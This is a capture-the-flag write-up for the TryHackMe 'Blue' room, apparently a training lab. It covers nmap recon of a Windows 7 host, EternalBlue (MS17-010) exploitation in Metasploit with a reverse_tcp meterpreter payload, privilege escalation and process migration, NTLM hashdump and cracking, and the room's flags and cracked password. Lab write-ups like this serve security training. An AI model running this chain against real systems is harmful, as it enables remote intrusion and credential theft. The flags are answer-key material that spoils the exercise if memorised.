
Title: Eternal Blue Machine (TryHackMe)
Link: https://tryhackme.com/room/blue
Description: This lab discusses on using the smb v1 vulnerable to eternal blue to get immediate Critical Remote Code Execution.(RCE) 

```
export IP=10.10.113.13
```

# Task 1: (Recon)

Nmap scan 

```(nmap)
nmap -sC -sV -vv -Pn $IP
Reason: 991 resets
PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack ttl 125 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Service
49152/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49158/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49160/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h40m07s, deviation: 2h53m13s, median: 6s
| nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:3d:7a:c3:a9:c8 (unknown)
| Names:
|   JON-PC<00>           Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   JON-PC<20>           Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   02 3d 7a c3 a9 c8 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 45702/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 64617/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 26205/udp): CLEAN (Failed to receive data)
|   Check 4 (port 4771/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-07-18T06:11:58-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-07-18T11:11:58
|_  start_date: 2020-07-18T10:08:58
```

So, we have 3 port open under 1000 [135,139,445]

```(nmap scripting engine)
nmap --script=smb-vuln* $IP

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

```

Vulnerability: ms17-010(Eternal Blue)


# Task 2: (Gain Access)

Open Metasploit and set the following options.

```(msfconsole)
msfconsole
use eternalblue
set RHOST [vuln-machine]
set LHOST [our-vpn-ip/Listeners-ip]
set payload windows/x64/meterpreter/reverse_tcp
```

Lets get a meterpreter shell from a normal DOS shell now if we get a DOS shell

# Task 3: (Esclate Privileges)

We use the shell_to_meterpreter module to esclate the DOS shell 

```(upgrading shell)
use shell_to_meterpreter
set SESSION [session-id]
run
```
Now we are greeted with a meterpreter shell.

Lets verify if we are NT Authority/System

```(meterpreter)
getuid
getsystem
shell
```

Lets try to check who we are in the DOS shell. Just because we are NT Authority/System doesnot imply our process is NT Authority so, we migrate our process to a process running on the nt authority/system by using its pid or pname.

```(shell)
whoami
migrate -N winlogon.exe
```

# Task 4: (Cracking)

Use hashdump to dump all of the passwords on the machine as long as we have the correct privileges to do so.

```
hashdump
``` 

Using Crackstation or john to crack the NTLM hash

```(Credentials)
username:password  Jon:alqfna22
```
# Task 5: (Find flags)

The first flag is located on ` C:/>flag1.txt `

```(Flag 1)
flag{access_the_machine}
```

In order to crack passwords you must first obtain the hashes stored within the operating system. These hashes are stored in the Windows SAM file. This file is located on your system at C:\Windows\System32\config but is not accessible while the operating system is booted up.

`C:/Windows/System32/config`

```(Flag 2)
flag{sam_database_elevated_access}
```

```
search -f flag*.txt
```

```(Flag 3)
flag{admin_documents_can_be_valuable}
```